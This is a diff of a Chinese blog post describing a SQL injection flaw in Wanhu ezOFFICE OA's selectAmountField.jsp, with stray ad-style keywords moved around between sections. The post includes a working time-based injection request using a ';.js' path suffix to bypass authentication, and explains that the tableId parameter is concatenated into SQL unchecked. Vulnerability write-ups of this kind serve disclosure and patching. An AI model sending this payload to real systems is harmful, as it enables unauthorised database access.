@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 0x01 产品简介
 
-万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
+万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户[数据](#)统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
 
-编程
+工厂自动化
 
 # 0x02 漏洞概述
 
@@ -20,6 +20,14 @@ asset_dir: embedded-base64
 
 # 漏洞复现
 
+深入探索
+
+脚本语言
+
+计算机科学
+
+防病毒程序与恶意软件
+
 ```
 GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=1+and+1=dbms_pipe.receive_message('RDS',5)-- HTTP/1.1
 Host: 192.168.22.187:7001
@@ -30,17 +38,9 @@ Host: 192.168.22.187:7001
 
 # 漏洞分析
 
-深入探索
-
-Java（编程语言）
-
-脚本语言
-
-开发工具
-
 > 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
 >
-> 营销
+> Java（编程语言）
 
 platform/custom/custom\_[database](#)/dropdownselect/selectAmountField.jsp 代码如下，非常简单！
 
@@ -94,7 +94,7 @@ try {
 
 `tableId` 通过 `request.getParameter` 获取后直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，就是这么朴实无华！
 
-软件
+黑客与破解
 
 # 最后
 
